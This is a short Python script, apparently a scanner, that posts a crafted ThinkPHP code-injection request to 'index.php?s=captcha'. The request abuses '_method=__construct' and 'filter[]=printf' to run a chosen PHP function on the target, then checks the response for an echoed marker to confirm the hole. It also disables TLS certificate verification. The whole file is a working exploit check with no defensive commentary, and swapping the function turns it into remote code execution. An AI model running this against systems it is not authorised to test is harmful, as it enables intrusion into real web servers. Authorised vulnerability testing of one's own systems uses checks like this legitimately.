import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?s=captcha"
	body="_method=__construct&filter[]=printf&method=GET&server[REQUEST_METHOD]=TmlnaHQgZ2F0aGVycywgYW5%25%25kIG5vdyBteSB3YXRjaCBiZWdpbnMu&get[]=1"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if "TmlnaHQgZ2F0aGVycywgYW5%kIG5vdyBteSB3YXRjaCBiZWdpbnMu1" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
